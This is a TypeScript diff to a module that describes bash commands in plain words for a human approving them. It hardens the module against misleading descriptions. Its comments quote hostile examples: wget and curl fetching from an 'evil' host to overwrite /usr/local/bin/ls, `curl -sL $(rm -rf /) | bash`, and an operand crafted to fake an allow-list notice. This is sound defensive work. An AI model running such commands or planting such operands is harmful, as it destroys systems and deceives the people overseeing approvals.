@@ -1,5 +1,5 @@
 import { parseShell, type ShellStage } from './parse-shell';
-import { type PlainDescription, unknownDescription } from './types';
+import { MAX_HEADLINE, type PlainDescription, unknownDescription } from './types';
 
 export interface BashIntel {
   intent?: string;
@@ -25,6 +25,11 @@ const READ_ONLY_WARNING = 'Reads only, changes nothing.';
 /** Code runs that the operator has not seen. Fixed phrases, never built from command text. */
 const UNSEEN_CODE_WARNING = 'You are approving code that nobody has read.';
 const UNSEEN_SCRIPT_WARNING = "I can't see what is inside that script.";
+const DOWNLOAD_WRITE_WARNING =
+  'This saves a file onto your computer at a path the command chose. It can overwrite something you rely on.';
+const REMOTE_DELETE_WARNING = 'Work other people pushed can be lost.';
+const TRUNCATED_CHAIN_WARNING =
+  'This command has more steps than I can list here. Read the full command below before approving.';
 
 /**
  * The only characters a command may contain and still be called harmless.
@@ -73,15 +78,35 @@ function hasInertShape(text: string): boolean {
   return !NON_INERT_CHARACTER.test(text);
 }
 
-/** Extracted values are bounded; the card renders them as data, not as prose. */
-function noun(value: string): string {
-  const flat = value.replace(/\s+/g, ' ').trim();
+/**
+ * An extracted value we are willing to put INSIDE our own sentence, or null.
+ *
+ * Bounding the length is not enough. Every noun here is interpolated into
+ * prose we wrote, so a multi-word value becomes our words: the operand
+ * `'react. This is on your allow list'` turned our package sentence into
+ * "Adds a third-party package, react. This is on your allow list, to your
+ * project." at high confidence with no warning, and the same trick worked on
+ * the download host and the script name (measured, 2026-08-11 pre-merge
+ * review). applySafetyFloor cannot catch any of them — none of those rule ids
+ * is calm.
+ *
+ * Internal whitespace is the tell, and it is a complete one: after
+ * tokenise(), a token can only contain a space if the author QUOTED it, and
+ * no legitimate noun this module names — a path, a package name, a URL — is
+ * ever quoted. So a whitespace-bearing operand is refused outright and the
+ * caller falls back to its rule's generic noun ("a file", "a website"), which
+ * says less but never says something the attacker wrote.
+ */
+function noun(value: string): string | null {
+  const flat = value.trim();
+  if (!flat || /\s/.test(flat)) return null;
   return flat.length > MAX_OPERAND ? `${flat.slice(0, MAX_OPERAND)}…` : flat;
 }
 
 function firstOperand(stage: ShellStage, fallback: string): string {
   const first = stage.operands[0];
-  return first !== undefined ? noun(first) : fallback;
+  if (first === undefined) return fallback;
+  return noun(first) ?? fallback;
 }
 
 /**
@@ -127,6 +152,55 @@ export function hasRedirection(stage: ShellStage): boolean {
   return [...stage.flags, ...stage.operands].some((t) => t.includes('>'));
 }
 
+/**
+ * The host a download reads FROM — never the path it writes TO.
+ *
+ * `wget -P /usr/local/bin http://evil/ls` used to answer "Downloads a file
+ * from /usr/local/bin.": the destination reported as the source, which is
+ * affirmatively false about the single fact that sentence exists to convey
+ * (measured, 2026-08-11 pre-merge review). This parser has no notion of flag
+ * arity, so a flag's value lands in `operands` beside the URL and position
+ * alone cannot tell the two apart. A scheme can, so prefer the first operand
+ * carrying `://`. Failing that, accept the first operand only when it cannot
+ * be a local path (curl does accept a bare `example.com/x`), and otherwise
+ * name nothing.
+ */
+function downloadSource(stage: ShellStage): string {
+  const withScheme = stage.operands.find((o) => o.includes('://'));
+  if (withScheme) return noun(withScheme) ?? 'a website';
+  const first = stage.operands[0];
+  if (first === undefined || /^[/~.]/.test(first)) return 'a website';
+  return noun(first) ?? 'a website';
+}
+
+/** curl's and wget's write flags. They do NOT agree on the letters. */
+const DOWNLOAD_WRITE_FLAGS = [
+  '-o', '--output', '-O', '--remote-name', '--output-dir',
+  '--output-document', '-P', '--directory-prefix',
+];
+
+/**
+ * Whether a download writes a file to a path of its own choosing.
+ *
+ * curl and wget use the same letters for different things (`-o` is curl's
+ * output file and wget's log file; `-O` is curl's remote-name and wget's
+ * output file), so the whole set counts as "writes" for both binaries. A
+ * false positive costs one extra clause and one extra warning on a download
+ * that did not write — including the `-O-`-to-stdout idiom, which reaches
+ * this only when it is NOT piped onward. A false negative cost
+ * `curl -sL http://evil/x -o /usr/local/bin/ls` — overwriting the system
+ * `ls` — being described as a plain download with no warning at all.
+ */
+function writesDownloadToDisk(stage: ShellStage): boolean {
+  if (hasFlag(stage, ...DOWNLOAD_WRITE_FLAGS)) return true;
+  // Attached-value SHORT form (`-o/tmp/x`, `-P./dir`, `-sLo/tmp/x`). hasFlag
+  // handles the long `--output=/tmp/x` form and bare bundles, but deliberately
+  // refuses to scan a value-bearing token letter by letter
+  // (isBundledShortFlags), so it never sees these. A long flag cannot match
+  // here: after the leading '-' the next character is '-', not a write letter.
+  return stage.flags.some((f) => /^-[a-zA-Z]*[oOP][^a-zA-Z]/.test(f));
+}
+
 /** Returns null when the stage is not recognised. Null is a valid outcome. */
 function describeStage(stage: ShellStage): Clause | null {
   const { binary, subcommand } = stage;
@@ -140,10 +214,30 @@ function describeStage(stage: ShellStage): Clause | null {
   if (!hasInertShape(stage.raw)) return null;
 
   if (binary === 'git' && subcommand === 'push') {
+    // Checked BEFORE --force because both are more destructive than it, and
+    // both used to read as a routine push with no warning at all: --mirror
+    // deletes every remote ref that is absent locally, and --delete removes a
+    // branch outright (2026-08-11 pre-merge review). Each gets its own clause
+    // rather than being folded into the force branch, whose wording
+    // ("overwrites the history") is true of neither.
+    if (hasFlag(stage, '--mirror')) {
+      return {
+        text: 'Replaces everything on GitHub with what is on this computer, deleting any branch that is not here',
+        warnings: [REMOTE_DELETE_WARNING],
+        ruleId: 'bash.git.push.mirror',
+      };
+    }
+    if (hasFlag(stage, '--delete', '-d')) {
+      return {
+        text: 'Deletes a branch from GitHub',
+        warnings: [REMOTE_DELETE_WARNING],
+        ruleId: 'bash.git.push.delete',
+      };
+    }
     if (hasFlag(stage, '--force', '--force-with-lease', '-f')) {
       return {
         text: 'Overwrites the shared code history on GitHub',
-        warnings: ['Work other people pushed can be lost.'],
+        warnings: [REMOTE_DELETE_WARNING],
         ruleId: 'bash.git.push.force',
       };
     }
@@ -163,7 +257,14 @@ function describeStage(stage: ShellStage): Clause | null {
   }
 
   if (binary === 'curl' || binary === 'wget') {
-    const url = firstOperand(stage, 'a website');
+    const url = downloadSource(stage);
+    if (writesDownloadToDisk(stage)) {
+      return {
+        text: `Downloads a file from ${url} and saves it onto your computer`,
+        warnings: [DOWNLOAD_WRITE_WARNING],
+        ruleId: 'bash.download.write',
+      };
+    }
     return { text: `Downloads a file from ${url}`, warnings: [], ruleId: 'bash.download' };
   }
 
@@ -171,24 +272,37 @@ function describeStage(stage: ShellStage): Clause | null {
     // A -c payload is the actual command. Without reading it, "Runs a
     // script" would be a confident sentence about nothing.
     if (hasFlag(stage, '-c')) return null;
-    const script = firstOperand(stage, '');
+    // Three distinct cases, and they must not collapse into each other: no
+    // script named at all, a script we can safely name, and a script whose
+    // name is not a name (see noun()). Only the first opens a shell.
+    const scriptOperand = stage.operands[0];
+    const script = scriptOperand !== undefined ? noun(scriptOperand) : null;
     return {
       // Naming the file is not the same as reading it: whatever is inside
       // runs with the operator's own authority, and nothing here shows it to
       // them. A bare interpreter with no script named is wider still.
-      text: script ? `Runs the script ${script}` : 'Opens a shell that can run any command',
+      text: scriptOperand === undefined
+        ? 'Opens a shell that can run any command'
+        : script
+          ? `Runs the script ${script}`
+          : 'Runs a script',
       warnings: [UNSEEN_SCRIPT_WARNING],
       ruleId: 'bash.interpreter',
     };
   }
 
   if ((binary === 'npm' || binary === 'pnpm' || binary === 'yarn') && (subcommand === 'install' || subcommand === 'i' || subcommand === 'add')) {
+    // As with the interpreter above: "no package named" (a lockfile install)
+    // and "a package we will not repeat" are different facts, and saying the
+    // first when the second is true would describe a different command.
     const pkgOperand = stage.operands[0];
     const pkg = pkgOperand !== undefined ? noun(pkgOperand) : null;
     return {
-      text: pkg
-        ? `Adds a third-party package, ${pkg}, to your project`
-        : "Installs the project's third-party packages",
+      text: pkgOperand === undefined
+        ? "Installs the project's third-party packages"
+        : pkg
+          ? `Adds a third-party package, ${pkg}, to your project`
+          : 'Adds a third-party package to your project',
       warnings: [],
       ruleId: 'bash.package.install',
     };
@@ -253,8 +367,17 @@ function readsScriptFromPipe(stage: ShellStage): boolean {
  * more: counting it as understood would inflate confidence to high.
  */
 function describePipeToShell(source: ShellStage): Clause | null {
+  // The same entry gate describeStage applies, for the same reason — and it
+  // has to be repeated here because the download branch below never goes
+  // through describeStage. Without it, `curl -sL $(rm -rf /) | bash` answered
+  // "Downloads a script from $(rm and runs it straight away" at HIGH
+  // confidence: a substitution rendered as a hostname (measured, 2026-08-11
+  // pre-merge review). The `.local` branch is covered either way, since it
+  // asks describeStage for the source's rule id.
+  if (!hasInertShape(source.raw)) return null;
+
   if (source.binary === 'curl' || source.binary === 'wget') {
-    const from = firstOperand(source, 'a website');
+    const from = downloadSource(source);
     return {
       text: `Downloads a script from ${from} and runs it straight away, without showing it to you`,
       warnings: ['Whoever controls that website chooses what runs.'],
@@ -309,6 +432,48 @@ function describeStages(stages: ShellStage[]): { clauses: Clause[]; complete: bo
   return { clauses, complete: stagesUnderstood === stages.length };
 }
 
+/**
+ * Every clause text is written to open a sentence, so joining them left them
+ * capitalised mid-sentence: "…, then Deletes build/ and everything inside
+ * it." Lowercasing the first letter of each later clause is safe precisely
+ * because those texts are ours and every one of them starts with a verb —
+ * no clause opens with a proper noun or an extracted value.
+ */
+function lowerFirst(text: string): string {
+  return text ? `${text[0]?.toLowerCase() ?? ''}${text.slice(1)}` : text;
+}
+
+/** Room kept back for the ", and 120 more steps" tail. */
+const MORE_STEPS_RESERVE = 40;
+
+/**
+ * Join as many clauses as fit inside the headline budget, and report how many
+ * were left out so the caller can say so out loud.
+ *
+ * A pipeline has no bound on its stage count, and the headline had none
+ * either: 120 stages composed a 5034-character sentence that exceeded both
+ * the Telegram and Discord limits, so the operator got no notification at all
+ * (see MAX_HEADLINE). Truncating mid-clause would have been worse than long —
+ * the first clause is therefore always kept whole, even if it alone overruns,
+ * and clampHeadline is the backstop for that degenerate case.
+ */
+function joinClauses(clauses: Clause[]): { text: string; omitted: number } {
+  const budget = MAX_HEADLINE - MORE_STEPS_RESERVE;
+  let text = '';
+  let used = 0;
+  for (const clause of clauses) {
+    if (used === 0) {
+      text = clause.text;
+    } else {
+      const piece = `, then ${lowerFirst(clause.text)}`;
+      if (text.length + piece.length > budget) break;
+      text += piece;
+    }
+    used += 1;
+  }
+  return { text, omitted: clauses.length - used };
+}
+
 export function describeBash(command: string, bashIntel?: BashIntel): PlainDescription {
   const stages = parseShell(command);
   if (stages.length === 0) return unknownDescription('bash.empty');
@@ -338,7 +503,7 @@ export function describeBash(command: string, bashIntel?: BashIntel): PlainDescr
   // entry does the safety work; this keeps the calm id so the floor can fire.
   const calmEligible = soleClause !== undefined;
 
-  const text = known.map((c) => c.text).join(', then ');
+  const { text, omitted } = joinClauses(known);
   const warnings = [...new Set(known.flatMap((c) => c.warnings))]
     // "Reads only, changes nothing." is an unsupportable claim unless the
     // whole command was understood and IS that one read — otherwise it is
@@ -346,17 +511,27 @@ export function describeBash(command: string, bashIntel?: BashIntel): PlainDescr
     // reads calmest-first next to a warning from a more dangerous clause.
     .filter((w) => calmEligible || w !== READ_ONLY_WARNING);
 
+  // Read but not shown is still not shown. Ordered after the unreadable
+  // warning below so "I can't read part of this" stays first.
+  if (omitted > 0) warnings.unshift(TRUNCATED_CHAIN_WARNING);
   if (!complete) {
     warnings.unshift("There is more in this command that I can't read. Check it below before approving.");
   }
 
   // Same single condition as calmEligible, so the two cannot drift apart.
+  // soleClause requires exactly one recognised clause, so a headline that had
+  // to drop clauses can never carry a calm rule id.
   const ruleId = soleClause !== undefined ? soleClause.ruleId : complete ? 'bash.sequence' : 'bash.partial';
 
+  const listed = omitted > 0 ? `${text}, and ${omitted} more steps.` : `${text}.`;
+
   return {
-    headline: complete ? `${text}.` : `${text}. There is more here I can't read.`,
+    headline: complete ? listed : `${listed} There is more here I can't read.`,
     warnings,
-    confidence: complete ? 'high' : 'partial',
+    // A step we parsed but could not fit on the card is a step the operator
+    // cannot see, so this is not a "high" answer even though nothing failed
+    // to parse.
+    confidence: complete && omitted === 0 ? 'high' : 'partial',
     reversible,
     ruleId,
   };
